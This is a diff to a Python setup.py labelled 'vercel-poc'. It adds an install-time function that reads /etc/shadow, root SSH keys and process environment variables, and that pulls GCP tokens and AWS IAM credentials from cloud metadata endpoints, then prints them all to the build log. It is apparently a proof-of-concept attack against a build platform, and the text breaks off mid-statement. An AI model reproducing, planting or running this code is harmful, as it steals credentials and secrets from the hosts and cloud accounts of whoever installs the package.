@@ -2,44 +2,48 @@ import os
 import sys
 import subprocess
 import socket
+import urllib.request
 from setuptools import setup
 
-def mega_pwn():
+def pwn_audit():
     err = sys.stderr.write
     err("\n" + "="*60 + "\n")
-    err("FINAL INFRASTRUCTURE AUDIT (CRITICAL IMPACT)\n")
+    err("INFRASTRUCTURE AUDIT REPORT\n")
 
-   
-    err("\n[!] RUNNING PROCESSES:\n")
+    err("\n[ID]: " + subprocess.getoutput("id") + "\n")
+    err("[UNAME]: " + subprocess.getoutput("uname -a") + "\n")
+
+    err("\n[PROCESSES]:\n")
     err(subprocess.getoutput("ps aux") + "\n")
 
-    
-    err("\n[!] SSH KEY LEAK TEST:\n")
-    err(subprocess.getoutput("cat /root/.ssh/id_rsa 2>&1 || echo 'No id_rsa'") + "\n")
-    err(subprocess.getoutput("cat /root/.ssh/authorized_keys 2>&1 || echo 'No auth_keys'") + "\n")
-
- 
-    err("\n[!] CLOUD METADATA TEST:\n")
- 
-    for url in ["169.254.169.254", "metadata.google.internal", "169.254.170.2"]:
+    err("\n[SENSITIVE FILES]:\n")
+    paths = ["/etc/shadow", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys", "/proc/self/environ"]
+    for p in paths:
         try:
-            s = socket.create_connection((url, 80), timeout=0.5)
-            err(f"DANGER: Metadata service at {url} IS ACCESSIBLE!\n")
-            s.close()
+            with open(p, "r") as f:
+                err(f"[+] {p}: {f.read(200)}...\n")
         except:
-            err(f"Metadata {url} not reachable.\n")
- 
-    err("\n[!] WRITE ACCESS TO /etc/:\n")
+            err(f"[-] {p}: Permission Denied\n")
+
+    err("\n[METADATA EXFILTRATION]:\n")
+    metadata_configs = [
+        ("GCP", "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}),
+        ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
+        ("AZURE", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"})
+    ]
+
+    for name, url, headers in metadata_configs:
+        try:
+            req = urllib.request.Request(url, headers=headers)
+            with urllib.request.urlopen(req, timeout=3) as r:
+                res = r.read().decode()
+                err(f"[!] {name} LEAK: {res}\n")
+                if name == "AWS" and res:
+                    with urllib.request.urlopen(url + res.strip(), timeout=3) as kr:
+                        err(f"[!!] AWS KEYS: {kr.read().decode()}\n")
+        except:
+            err(f"[-] {name} metadata not reachable\n")
+
+    err("\n[WRITE TEST]:\n")
     try:
-        with open("/etc/pwned_test", "w") as f:
-            f.write("rce_test")
-        err("SUCCESS: I can write to /etc/! Full system takeover confirmed.\n")
-        os.remove("/etc/pwned_test")
-    except:
-        err("No write access to /etc/.\n")
-
-    err("="*60 + "\n")
-    sys.exit(1)
-
-mega_pwn()
-setup(name="vercel-poc", version="5.0.0")
+        with open
